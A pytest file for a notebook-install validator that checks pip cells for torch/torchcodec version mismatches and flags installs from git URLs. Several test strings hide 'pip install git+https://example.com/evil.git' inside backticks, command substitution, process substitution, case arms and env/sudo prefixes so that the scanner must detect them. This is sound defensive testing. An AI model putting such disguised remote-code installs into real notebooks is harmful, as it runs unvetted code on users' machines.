            "!echo git+https://example.com/evil.git; pip install numpy", "nb.ipynb", 0
        )
        == []
    )

    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!env -u X pip install "torch==2.12.0"', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )


def test_notebook_validator_keeps_redirections_and_quoted_process_forms():
    """`>|` overrides noclobber rather than piping, and `<( )` inside double quotes is text."""
    nv = _load_notebook_validator_module()

    redirected = (
        "!echo harmless >| pip install git+https://example.com/pkg.git; pip install unsloth"
    )
    assert nv.rule_inst_001_git_plus(redirected, "nb.ipynb", 0) == []

    quoted = '!echo "<(pip install git+https://example.com/pkg.git)"; pip install unsloth'
    assert nv.rule_inst_001_git_plus(quoted, "nb.ipynb", 0) == []

    # Unquoted it runs, and a real pipeline still separates.
    assert any(
        f.rule == "R-INST-001"
        for f in nv.rule_inst_001_git_plus(
            "!cat <(pip install git+https://example.com/pkg.git)", "nb.ipynb", 0
        )
    )
    assert any(
        f.rule == "R-INST-001"
        for f in nv.rule_inst_001_git_plus(
            "!echo x | pip install git+https://example.com/evil.git", "nb.ipynb", 0
        )
    )


def test_notebook_validator_reads_a_range_as_one_window():
    """A `>=X,<Y` pair is the constraint `~=X`, and the guard's own remedy is spelled that way,
    so the rule has to read it back. A `<` with nothing under it names no version."""
    nv = _load_notebook_validator_module()

    # Colab is on 0.11, which this window excludes, so pip drops into the 0.10 line.
    narrowed = '!pip install "torchcodec>=0.10,<0.11"'
    assert len(nv.rule_inst_004_torchcodec_torch(narrowed, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    # The window torch 2.11 actually wants is a no-op on the same baseline.
    matching = '!pip install "torchcodec>=0.11,<0.12.0"'
    assert nv.rule_inst_004_torchcodec_torch(matching, COLAB_TORCH211, "nb.ipynb", 0) == []

    # A ceiling on a minor boundary DOES name the landing, whatever the major: `<2.11` drops
    # the installed 2.11 to the 2.10 line, which the image's codec 0.11 does not pair with.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch<2.11"', COLAB_TORCH211, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]
    # A ceiling on a MAJOR boundary names nothing: which 1.x minor sits below `<2.0` is only
    # in the index, so no stale baseline is kept either.
    assert nv._highest_minor_below("2.0") == ""
    assert (
        nv.rule_inst_004_torchcodec_torch('!pip install "torch<2.0"', COLAB_TORCH211, "nb.ipynb", 0)
        == []
    )

    # An inclusive cap does name one, so it still clamps rather than clearing.
    capped = '!pip install "torch==2.12.0" "torchcodec>=0.12"\n!pip install "torchcodec<=0.11"'
    assert len(nv.rule_inst_004_torchcodec_torch(capped, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_reads_the_compatible_release_ceiling():
    """`~=` pins a window, so it moves the baseline down as well as up. PEP 440 drops the
    last component: `~=2.10.0` allows `<2.11`, `~=2.10` allows `<3`."""
    nv = _load_notebook_validator_module()

    assert nv._compatible_release_ceiling("2.10.0") == "2.11"
    assert nv._compatible_release_ceiling("2.10") == "3"
    assert nv._compatible_release_ceiling("2") is None

    # Colab is on torch 2.11, which `~=2.10.0` excludes, so pip drops into the 2.10 line.
    downgraded = '!pip install "torch~=2.10.0"'
    assert len(nv.rule_inst_004_torchcodec_torch(downgraded, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    # `~=2.10` admits 2.11, and `~=2.11.0` is already satisfied. Neither moves anything.
    for cell in ('!pip install "torch~=2.10"', '!pip install "torch~=2.11.0"'):
        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], cell


def _git_plus_rules(line: str) -> list[str]:
    nv = _load_notebook_validator_module()
    return [f.rule for f in nv.rule_inst_001_git_plus(line, "t.ipynb", 0)]


def test_a_prefix_operand_named_pip_is_not_the_executable():
    """`env -u pip` unsets the variable `pip`; the command is the word after it. Selecting the
    first pip-looking word produced `pip pip install ...`, which PIP_LINE_RE rejects."""
    assert _git_plus_rules("!env -u pip pip install git+https://example.com/pkg.git") == [
        "R-INST-001"
    ]
    # The control that always worked: the operand is spelled something else.
    assert _git_plus_rules("!env -u VAR pip install git+https://example.com/pkg.git") == [
        "R-INST-001"
    ]


def test_prefix_operands_are_consumed_for_every_supported_prefix():
    for line in (
        "!sudo -u pip pip install git+https://example.com/pkg.git",
        "!env --unset=pip pip install git+https://example.com/pkg.git",
        "!env -u pip -u also A=1 pip install git+https://example.com/pkg.git",
        "!nohup pip install git+https://example.com/pkg.git",
        "!env -- pip install git+https://example.com/pkg.git",
    ):
        assert _git_plus_rules(line) == ["R-INST-001"], line


def test_a_command_list_inside_backticks_is_not_split_at_its_own_separator():
    """Backticks run their contents like `$( )`, so the `;` inside one is not this line's, and
    splitting there handed `_substitution_bodies` a fragment it cannot read."""
    assert _git_plus_rules(
        "!echo `pip install git+https://example.com/pkg.git; echo ok`; pip install unsloth"
    ) == ["R-INST-001"]
    # The control: the same shape written as `$( )` was caught before this fix.
    assert _git_plus_rules(
        "!echo $(pip install git+https://example.com/pkg.git); pip install unsloth"
    ) == ["R-INST-001"]
    # Single quotes make a backtick literal, so nothing runs and nothing is flagged.
    assert _git_plus_rules("!echo 'a `pip install git+https://example.com/p.git` b'") == []


def test_every_case_arm_is_scanned_not_just_the_ones_before_an_empty_piece():
    """`;;` emits an empty piece and `esac` unwraps to "", so `out` outran `commands` and `zip`
    dropped the arm holding the substitution off the end."""
    assert _git_plus_rules(
        "!case x in y) echo no;; x) echo $(pip install git+https://example.com/pkg.git);; esac"
    ) == ["R-INST-001"]
    # The control: in the first arm, before any empty piece has been dropped.
    assert _git_plus_rules(
        "!case x in x) echo $(pip install git+https://example.com/pkg.git);; y) echo no;; esac"
    ) == ["R-INST-001"]


def test_an_arm_close_paren_is_not_stripped_off_a_substitution():
    """`rstrip(")}")` ate the `)` that closes a `$( )` when no `(` had been stripped."""
    nv = _load_notebook_validator_module()
    text, conditional = nv._unwrap_shell_group(" x) echo $(pip install git+https://e.com/p.git)")
    assert conditional is True
    assert text.endswith(")"), text
    assert nv._substitution_bodies(text) == ["pip install git+https://e.com/p.git"]
    # A real group still loses its brackets.
    assert nv._unwrap_shell_group("( pip install x )")[0] == "pip install x"


def test_operators_inside_a_parameter_expansion_stay_literal():
    """`${X:-a||b}` is one word to bash, the `||` being part of the fallback, and splitting
    there manufactured a pip command bash never runs. A false positive, unlike the rest."""
    nv = _load_notebook_validator_module()

    line = "!echo ${X:-plain||pip install git+https://example.com/pkg.git}"
    assert len(nv._split_chained(line)) == 1
    assert nv.rule_inst_001_git_plus(line, "nb.ipynb", 0) == []

    # A `$( )` inside an expansion does run, and is still read.
    ran = "!echo ${X:-$(pip install git+https://example.com/pkg.git)}"
    assert [f.rule for f in nv.rule_inst_001_git_plus(ran, "nb.ipynb", 0)] == ["R-INST-001"]

    # A real brace group still splits on its own separators.
    grouped = "!{ echo a; pip install git+https://example.com/pkg.git; }"
    assert [f.rule for f in nv.rule_inst_001_git_plus(grouped, "nb.ipynb", 0)] == ["R-INST-001"]


def test_a_cap_only_install_after_an_uninstall_lands_on_the_cap():
    """`pip install "x<=V"` on an absent package installs V, so it is not still absent, and
    treating a cap-only requirement as nothing made R-INST-004 silent on a downgrade."""
    nv = _load_notebook_validator_module()

    cell = '!pip uninstall -y torchcodec\n!pip install "torchcodec<=0.10"'
    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    assert nv._effective_version(
        cell, "torchcodec", colab["torchcodec"], nv._marker_environment(colab)
    ) == ("0.10", True)
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]

    # An exclusive ceiling names no landing version, so it stays unknown rather than guessing.
    open_ceiling = '!pip uninstall -y torchcodec\n!pip install "torchcodec<0.11"'
    assert nv._effective_version(
        open_ceiling, "torchcodec", colab["torchcodec"], nv._marker_environment(colab)
    ) == (None, True)


def test_the_os_oracle_is_documented_as_feeding_marker_evaluation():
    """os-info stopped being human-only when markers began reading its Python version, so the
    workflow refreshes it with the pip snapshot. Asserted here so the two cannot drift."""
    workflow = (REPO_ROOT / ".github" / "workflows" / "notebooks-ci.yml").read_text(
        encoding = "utf-8"
    )
    assert "refresh-colab \\\n              --all --snapshot-dir" in workflow
    assert "--out unsloth/scripts/data/colab_pip_freeze.gpu.txt \\\n            ||" not in workflow


def test_a_top_level_extra_marker_is_false_not_unknown():
    """`extra` is bound only while resolving a selected extra's metadata; for a requirement handed
    straight to pip it is empty, so `extra == "foo"` is false and pip drops it ("Ignoring certifi:
    markers ... don't match your environment"). Leaving it out of the environment replayed the pin
    and fired R-INST-004 on a notebook pip leaves alone."""
    nv = _load_notebook_validator_module()

    ignored = "!pip install \"torch==2.12.0; extra == 'foo'\""
    assert nv.rule_inst_004_torchcodec_torch(ignored, COLAB_TORCH211, "nb.ipynb", 0) == []

    # The same pin without the marker is still judged, so the gate did not go silent.
    applied = '!pip install "torch==2.12.0"'
    assert [
        f.rule for f in nv.rule_inst_004_torchcodec_torch(applied, COLAB_TORCH211, "nb.ipynb", 0)
    ] == ["R-INST-004"]


def test_a_cell_that_only_mentions_pip_is_not_an_install_cell():
    """`!echo "pip install foo"` matches the install-cell regex but runs no pip, so the compat rules
    compared the oracle against itself and reported the base image's own peft/torchao pair. A
    notebook with no install cell was always skipped; the lookalike now matches it."""
    nv = _load_notebook_validator_module()

    mention = '!echo "pip install foo"'
    nb = {
        "cells": [
            {
                "cell_type": "code",
                "source": [mention],
                "outputs": [],
                "metadata": {},
                "execution_count": None,
            }
        ],
        "metadata": {},
        "nbformat": 4,
        "nbformat_minor": 5,
    }
    # Still discovered as a candidate -- the forbid-pattern rules must keep seeing it.
    assert nv.install_cells(nb) == [(0, mention)]
    # But it parses to no invocation, which is what the compat rules key off now.
    assert list(nv.iter_pip_invocations(mention)) == []


def test_notebooks_ci_watches_the_oracle_that_feeds_marker_evaluation():
    """_marker_environment reads the image's Python out of colab_os_info.gpu.txt, so an OS-only
    rotation changes what the validator replays and has to run the lint and smoke jobs."""
    workflow = (REPO_ROOT / ".github" / "workflows" / "notebooks-ci.yml").read_text(
        encoding = "utf-8"
    )
    paths = workflow.split("paths:", 1)[1].split("jobs:", 1)[0]
    assert "'scripts/data/colab_os_info.gpu.txt'" in paths
    assert "'scripts/data/colab_pip_freeze.gpu.txt'" in paths


def test_the_marker_oracle_follows_the_selected_pip_snapshot(tmp_path, monkeypatch):
    """The Python version and the package snapshot must come from the SAME capture, and reading
    scripts/data unconditionally judged one image's packages with another's interpreter."""
    nv = _load_notebook_validator_module()

    paired = tmp_path / "snap"
    paired.mkdir()
    (paired / "colab_os_info.gpu.txt").write_text("Python 3.11.9\n", encoding = "utf-8")
    nv._set_colab_oracle_dir(paired)
    assert nv._colab_python_version() == "3.11.9"

    # A directory with no os-info answers nothing rather than falling back to the repo's.
    empty = tmp_path / "empty"
    empty.mkdir()
    nv._set_colab_oracle_dir(empty)
    assert nv._colab_python_version() is None

    nv._set_colab_oracle_dir(nv.DATA_DIR)


def test_the_cron_refreshes_both_oracles_not_just_the_packages():
    """The scheduled job refreshed the pip snapshot against a stale os-info, judging new
    packages with the old interpreter. The PR-time step uses --all; this one has to match."""
    workflow = (REPO_ROOT / ".github" / "workflows" / "notebooks-ci.yml").read_text(
        encoding = "utf-8"
    )
    assert "--out unsloth/scripts/data/colab_pip_freeze.gpu.txt" not in workflow
    assert workflow.count("--all --snapshot-dir unsloth/scripts/data") >= 2


def test_python_dash_m_pip_is_a_pip_invocation():
    """`python -m pip` is pip's recommended invocation and the cell regex already selected it,
    so a notebook using it reached the rules with zero invocations."""
    nv = _load_notebook_validator_module()

    for line in (
        "!python -m pip install git+https://example.com/pkg.git",
        "!python3 -m pip install git+https://example.com/pkg.git",
        "!python3.11 -m pip install -q git+https://example.com/pkg.git",
    ):
        invocations = list(nv.iter_pip_invocations(line))
        assert len(invocations) == 1, line
        assert invocations[0].tool == "pip", line
        assert invocations[0].packages == ["git+https://example.com/pkg.git"], line
        assert nv.rule_inst_001_git_plus(line, "nb/T.ipynb", 0), line

    # The bare forms keep their own tool, and a lookalike is still not pip.
    assert next(nv.iter_pip_invocations("!uv pip install foo")).tool == "uv-pip"
    assert next(nv.iter_pip_invocations("!pip install foo")).tool == "pip"
    assert not list(nv.iter_pip_invocations("!python -m pipx install foo"))


def test_a_conditional_only_cell_does_not_replay_the_bare_oracle(tmp_path):
    """`!command -v uv || pip install foo` runs pip only on the fallback side, so the compat
    rules, which replay unconditional invocations, compared the oracle against itself and
    blamed the notebook for the base image's own peft/torchao pair."""
    nv = _load_notebook_validator_module()

    conditional = "!command -v uv || pip install foo"
    assert list(nv.iter_pip_invocations(conditional))
    assert not list(nv.unconditional_pip_invocations(conditional))

    colab = {"peft": "0.20.0", "torchao": "0.10.0"}
    # The rule itself still reports on the bare oracle; the gate in cmd_lint is what keeps
    # such a cell away from it, so assert the property the gate reads.
    assert nv.rule_inst_003_peft_torchao(conditional, colab, "nb/T.ipynb", 0)

    notebook = {
        "cells": [
            {
                "cell_type": "code",
                "metadata": {},
                "source": [conditional + "\n"],
                "outputs": [],
                "execution_count": None,
            }
        ],
        "metadata": {
            "kernelspec": {"name": "python3", "display_name": "Python 3"},
            "language_info": {"name": "python"},
        },
        "nbformat": 4,
        "nbformat_minor": 0,
    }
    nb_dir = tmp_path / "nb"
    nb_dir.mkdir()
    (nb_dir / "Conditional_Only.ipynb").write_text(json.dumps(notebook), encoding = "utf-8")

    args = argparse.Namespace(
        notebooks_dir = str(tmp_path),
        colab_pin = None,
        no_pypi = True,
        json = False,
    )
    findings: list = []
    original_emit = nv._emit
    nv._emit = lambda f: findings.extend(f)
    try:
        nv.cmd_lint(args)
    finally:
        nv._emit = original_emit
    assert [f for f in findings if f.rule.startswith("R-INST-00")] == []


def test_python_version_drift_in_the_os_oracle_fails_strict():
    """_marker_environment reads the Python line out of os-info, so that key is rule-bearing
    even though the rest is human context: with only the pip freeze strict, an interpreter
    bump behind an unchanged package set left the cron green and the Python stale."""
    nv = _load_notebook_validator_module()

    assert nv.COLAB_STRICT_ORACLE == "pip-freeze.gpu.txt"
    assert "python" in nv.COLAB_STRICT_ORACLE_KEYS["os-info-gpu.txt"]
    # apt-list stays fully advisory: an Ubuntu bump nothing consults must not go red.
    assert "apt-list-gpu.txt" not in nv.COLAB_STRICT_ORACLE_KEYS
    # The key is the one _parse_os_lines actually emits for that line.
    assert nv._parse_os_lines("Python 3.13.15\nUbuntu 22.04\n")["python"] == "3.13.15"


def test_expanded_interpreter_forms_run_pip():
    """`!{sys.executable} -m pip` and an absolute interpreter path are the notebook-standard
    spellings, which unsloth_nb_pip_magic rewrites at runtime. Accepting only a literal
    `python*` left them matching _PIP_CELL_RE while yielding no invocation."""
    nv = _load_notebook_validator_module()

    for line in (
        "!{sys.executable} -m pip install git+https://example.com/pkg.git",
        '!"{sys.executable}" -m pip install git+https://example.com/pkg.git',
        "!/usr/bin/python3 -m pip install git+https://example.com/pkg.git",
        "!python3.11 -m pip install git+https://example.com/pkg.git",
    ):
        invocations = list(nv.iter_pip_invocations(line))
        assert len(invocations) == 1, line
        assert invocations[0].tool == "pip", line
        assert invocations[0].packages == ["git+https://example.com/pkg.git"], line
        assert nv.rule_inst_001_git_plus(line, "nb/T.ipynb", 0), line

    # A real shell brace group still unwraps, and a lookalike is still not pip.
    assert [i.packages for i in nv.iter_pip_invocations("!{ pip install foo; }")] == [["foo"]]
    assert [
        i.packages for i in nv.iter_pip_invocations("!pip install foo && { pip install bar; }")
    ] == [["foo"], ["bar"]]
    assert not list(nv.iter_pip_invocations("!{sys.executable} -m pipx install foo"))


def test_exception_coverage_skips_cells_that_run_no_pip(tmp_path):
    """install_cells is a text heuristic, so `!echo "pip install peft"` reaches
    rule_l12_exceptions_coverage running no pip, and its `applies` predicate emitted a
    blocking R-EXC-001 for a clause the notebook has no install to carry."""
    nv = _load_notebook_validator_module()

    (tmp_path / "nb").mkdir()
    (tmp_path / "update_all_notebooks.py").write_text(
        'DONT_UPDATE_EXCEPTIONS = ["Doc_Only.ipynb"]\n', encoding = "utf-8"
    )

    def write(source: str) -> None:
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "metadata": {},
                    "source": [source],
                    "outputs": [],
                    "execution_count": None,
                }
            ],
            "metadata": {
                "kernelspec": {"name": "python3", "display_name": "Python 3"},
                "language_info": {"name": "python"},
            },
            "nbformat": 4,
            "nbformat_minor": 0,
        }
        (tmp_path / "nb" / "Doc_Only.ipynb").write_text(json.dumps(notebook), encoding = "utf-8")

    write('!echo "pip install peft"\n')
    assert nv.rule_l12_exceptions_coverage(tmp_path) == []

    # A real install missing the clause is still a finding, so the gate did not mute the rule.
    write("!pip install peft\n")
    assert [f.rule for f in nv.rule_l12_exceptions_coverage(tmp_path)] == ["R-EXC-001"]

    write('!pip install peft "torchao>=0.16.0"\n')
    assert nv.rule_l12_exceptions_coverage(tmp_path) == []


def test_python_dash_m_uv_pip_is_a_uv_invocation():
    """unsloth_nb_pip_magic rewrites `(pip|uv)` after the module flag, and uv's interface is
    `uv pip <action>`, so accepting only `-m pip` left `!python -m uv pip install ...`
    matching _PIP_CELL_RE while yielding no invocation."""
    nv = _load_notebook_validator_module()

    for line in (
        "!python -m uv pip install git+https://example.com/pkg.git",
        "!{sys.executable} -m uv pip install git+https://example.com/pkg.git",
        "!/usr/bin/python3 -m uv pip install git+https://example.com/pkg.git",
    ):
        invocations = list(nv.iter_pip_invocations(line))
        assert len(invocations) == 1, line
        assert invocations[0].tool == "uv-pip", line
        assert invocations[0].packages == ["git+https://example.com/pkg.git"], line
        assert nv.rule_inst_001_git_plus(line, "nb/T.ipynb", 0), line

    # A plain `-m pip` stays pip, even under an interpreter path containing "uv".
    assert next(nv.iter_pip_invocations("!python -m pip install foo")).tool == "pip"
    assert next(nv.iter_pip_invocations("!/opt/uv-tools/python3 -m pip install foo")).tool == "pip"
    # And another module is still not pip.
    assert not list(nv.iter_pip_invocations("!python -m uvloop install foo"))


def test_the_cron_lint_job_installs_packaging():
    """_requirement_applies falls back to "applies" without Marker, so a job missing packaging
    replays every marked requirement, including the ones Colab's pip skips. A bare
    setup-python environment does not provide it."""
    workflow = (REPO_ROOT / ".github" / "workflows" / "notebooks-ci.yml").read_text(
        encoding = "utf-8"
    )

    install_steps = [
        line.strip()
        for line in workflow.splitlines()
        if line.strip().startswith("run: pip install -U pip")
    ]
    assert install_steps, "the cron lint job's install step moved; update this test"
    for step in install_steps:
        assert "packaging" in step, step


# Moved from tests/python/test_torchcodec_torch_compat.py: these exercise the pip replay and the
# shell reader, not the torchcodec matrix.


def test_the_2_11_row_does_not_flag_an_abi_stable_codec():
    """Adding the 2.11 row without the ABI-stable short-circuit is a false positive: torchcodec 0.12+
    is built against torch >=2.11 and upstream supports the pairing, but a bare `"2.11": {"0.11"}`
    row reports every 0.12..0.15 against it. The row and this exemption have to land together."""
    from scripts import notebook_validator as nv

    for codec in ("0.12.0", "0.15.0"):
        colab = {"torch": "2.11.0+cu128", "torchcodec": codec}
        assert nv.rule_inst_004_torchcodec_torch("", colab, "nb.ipynb", 0) == [], codec

    # Still lockstep below the ABI floor: 2.11 with 0.10 is the mismatch this PR exists for.
    mismatched = nv.rule_inst_004_torchcodec_torch(
        "", {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128"}, "nb.ipynb", 0
    )
    assert [f.rule for f in mismatched] == ["R-INST-004"]

    # And torch 2.10 is not covered by the exemption, so a 0.12 codec there still reports.
    old_torch = nv.rule_inst_004_torchcodec_torch(
        "", {"torch": "2.10.0+cu128", "torchcodec": "0.12.0"}, "nb.ipynb", 0
    )
    assert [f.rule for f in old_torch] == ["R-INST-004"]


def test_a_requested_codec_range_beats_the_preinstalled_oracle():
    """resolved_set overrides the oracle only on an exact `==`, so a cell asking for a RANGE still
    read as the preinstalled codec. Both bounds matter: `>=0.12.0,<0.13.0` on torch 2.12 was
    reported against the image's 0.11, and `>=0.10.0,<0.11.0` on torch 2.10 for the mirror reason,
    the ceiling ruling the oracle out rather than the floor."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    clean = [
        '!pip install torch==2.12.0 "torchcodec>=0.12.0,<0.13.0"',
        '!pip install torch==2.10.0 "torchcodec>=0.10.0,<0.11.0"',
        '!pip install torch==2.11.0 "torchcodec>=0.11.0,<0.12.0"',
        '!pip install torch==2.9.0 "torchcodec>=0.8.0,<0.10.0"',
    ]
    for cell in clean:
        assert nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0) == [], cell

    # The rule must still fire where pip really leaves a mismatch: an exact wrong pin, a bare torch
    # upgrade keeping the oracle codec, and a floor incompatible with the requested torch.
    flagged = [
        '!pip install torch==2.12.0 "torchcodec==0.11.0"',
        "!pip install torch==2.12.0",
        '!pip install torch==2.10.0 "torchcodec>=0.12.0"',
    ]
    for cell in flagged:
        assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0)] == [
            "R-INST-004"
        ], cell


def test_a_codec_range_is_read_in_order_and_only_when_unconditional():
    """Two ways the range reader could invent a version the cell never installs.

    Order: pip runs the commands in sequence, so `>=0.12.0` then `<0.12.0` ends pre-0.12, while
    intersecting across both invocations yields a 0.12 nothing installed. Markers: a requirement
    pip skips must not move anything, and with no oracle for the interpreter it is left alone and
    the cell judged on the preinstalled version."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}

    ordered = (
        '!pip install "torchcodec>=0.12.0"\n'
        '!pip install "torchcodec<0.12.0"\n'
        "!pip install torch==2.12.0"
    )
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(ordered, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ], "the later cap has to win over the earlier floor"

    marked = "!pip install torch==2.12.0 \"torchcodec>=0.12.0; python_version < '3.10'\""
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(marked, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ], "a marked requirement must not raise the effective codec"

    # The unconditional forms this reader exists for still resolve.
    for cell in (
        '!pip install torch==2.12.0 "torchcodec>=0.12.0,<0.13.0"',
        '!pip install torch==2.10.0 "torchcodec>=0.10.0,<0.11.0"',
    ):
        assert nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0) == [], cell


def test_a_ceiling_only_request_is_unknown_rather_than_the_excluded_oracle():
    """`pip install "torchcodec<0.10.0"` on a 0.11 image downgrades to a version only the index
    names, and returning the excluded oracle reported the pairing the cell just ruled out."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    ceiling_only = '!pip install torch==2.9.0 "torchcodec<0.10.0"'
    assert nv.rule_inst_004_torchcodec_torch(ceiling_only, colab, "nb.ipynb", 0) == []

    # A floor names where it lands, so that case still resolves and still judges.
    named = '!pip install torch==2.9.0 "torchcodec>=0.8.0,<0.10.0"'
    assert nv.rule_inst_004_torchcodec_torch(named, colab, "nb.ipynb", 0) == []
    wrong = '!pip install torch==2.9.0 "torchcodec>=0.11.0,<0.12.0"'
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(wrong, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]


def test_the_codec_reader_matches_pip_on_names_and_uninstalls():
    """Two ways the reader kept judging a codec the cell had already dealt with: PEP 503 makes
    `TorchCodec>=0.12.0` the same requirement, and an uninstall leaves nothing to judge while the
    reader still returned the oracle. Both were errors on a compatible notebook."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}

    cased = '!pip install torch==2.12.0 "TorchCodec>=0.12.0"'
    assert nv.rule_inst_004_torchcodec_torch(cased, colab, "nb.ipynb", 0) == []

    removed = "!pip uninstall -y torchcodec\n!pip install torch==2.12.0"
    assert nv.rule_inst_004_torchcodec_torch(removed, colab, "nb.ipynb", 0) == []

    # Putting it back incompatibly is still a finding: the uninstall is not a blanket mute.
    restored = "!pip uninstall -y torchcodec\n" '!pip install torch==2.12.0 "torchcodec==0.11.1"'
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(restored, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]


def test_compatible_release_and_inclusive_caps_are_read():
    """`~=0.12.0` is `>=0.12.0,<0.13.0` and `<=V` names its own landing, so reading neither let
    the oracle survive a request that had already moved it."""
    from scripts import notebook_validator as nv

    assert nv._compatible_release_ceiling("0.12.0") == "0.13"
    assert nv._compatible_release_ceiling("0.12") == "1"
    assert not nv._compatible_release_ceiling("1")  # `~=1` is invalid, so it bounds nothing

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install torch==2.12.0 "torchcodec~=0.12.0"', colab, "nb.ipynb", 0
        )
        == []
    )
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install torch==2.9.0 "torchcodec<=0.9"', colab, "nb.ipynb", 0
        )
        == []
    )
    # `~=` still lands somewhere, so a window on the wrong line is still reported.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            '!pip install torch==2.10.0 "torchcodec~=0.12.0"', colab, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]


def test_a_bounded_window_lands_on_its_newest_candidate():
    """pip resolves a window to the newest release it admits, not to the floor, so
    `torchcodec>=0.8,<0.11` on torch 2.9 installs the unsupported 0.10 line. Modelling it as the
    floor read 0.8 and called that compatible; the ceiling names the minor without an index."""
    from scripts import notebook_validator as nv

    assert nv._highest_minor_below("0.11") == "0.10"
    assert nv._highest_minor_below("0.13.0") == "0.12"
    assert nv._highest_minor_below("1") == ""  # not a 0.N ceiling, so it names nothing

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    spanning = '!pip install torch==2.9.0 "torchcodec>=0.8,<0.11"'
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(spanning, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]

    # A window whose top IS supported stays silent, so this did not just become noisy.
    within = '!pip install torch==2.9.0 "torchcodec>=0.8.0,<0.10.0"'
    assert nv.rule_inst_004_torchcodec_torch(within, colab, "nb.ipynb", 0) == []


def test_an_exclusive_ceiling_names_the_minor_pip_moves_to():
    """A window wider than one minor still names the MINOR pip lands on. `<0.10.5` admits 0.10.0
    to 0.10.4, so only a ceiling ON a minor boundary excludes the whole minor."""
    from scripts import notebook_validator as nv

    assert nv._highest_minor_below("0.10.5") == "0.10"
    assert nv._highest_minor_below("0.10.0") == "0.9"  # on the boundary, so 0.10 is excluded
    assert nv._highest_minor_below("0.11") == "0.10"
    assert nv._highest_minor_below("1") == ""  # not a 0.N ceiling, so it names nothing

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    cell = '!pip install torch==2.9.0 "torchcodec<0.10.5"'
    assert nv._effective_version(cell, "torchcodec", "0.11.0") == ("0.10", True)
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]
    assert nv._effective_version(
        '!pip install "torchcodec>=0.8,<0.11"', "torchcodec", "0.11.0"
    ) == (
        "0.10",
        True,
    )

    # A window whose top IS supported stays silent, so this did not just become noisy.
    within = '!pip install torch==2.9.0 "torchcodec>=0.8.0,<0.10.0"'
    assert nv.rule_inst_004_torchcodec_torch(within, colab, "nb.ipynb", 0) == []


def test_a_strict_lower_bound_excludes_the_installed_version():
    """`>0.11.0` rules out the 0.11.0 the image ships, and which release pip picks instead is
    only in the index, so the bound comes back inexact and the rule declines to judge."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    cell = '!pip install torch==2.12.0 "torchcodec>0.11.0"'
    assert nv._effective_version(cell, "torchcodec", "0.11.0") == ("0.11.0", False)
    assert nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0) == []

    # A strict bound the installed version already clears leaves it alone.
    satisfied = '!pip install "torchcodec>0.10.0"'
    assert nv._effective_version(satisfied, "torchcodec", "0.11.0") == ("0.11.0", True)


def test_a_later_install_keeps_what_an_earlier_one_landed_on():
    """pip does not reinstall a package that already satisfies the requirement, so `>=0.12.0`
    then the broader `>=0.10.0` ends on 0.12, while a command excluding it moves back down."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    widened = '!pip install torch==2.12.0 "torchcodec>=0.12.0"\n!pip install "torchcodec>=0.10.0"'
    assert nv._effective_version(widened, "torchcodec", "0.11.0")[0] == "0.12.0"
    assert nv.rule_inst_004_torchcodec_torch(widened, colab, "nb.ipynb", 0) == []

    narrowed = '!pip install "torchcodec>=0.12.0"\n!pip install "torchcodec<0.12.0"'
    assert nv._effective_version(narrowed, "torchcodec", "0.11.0") == ("0.11", True)

    # An exact pin after an uninstall restores a version rather than staying gone.
    restored = '!pip uninstall -y torchcodec\n!pip install "torchcodec==0.11.1"'
    assert nv._effective_version(restored, "torchcodec", "0.11.0") == ("0.11.1", True)


def test_an_exclusion_rules_out_the_installed_version():
    """`!=` inverts `==`, so `torchcodec!=0.11.0` makes pip replace the image's 0.11.0. Local
    labels are not compared, which matters because the oracle carries `+cu128`."""
    from scripts import notebook_validator as nv

    assert nv._version_is_excluded("0.11.0+cu128", "0.11.0")
    assert nv._version_is_excluded("0.11.5", "0.11.*")
    assert not nv._version_is_excluded("0.11.1", "0.11.0")
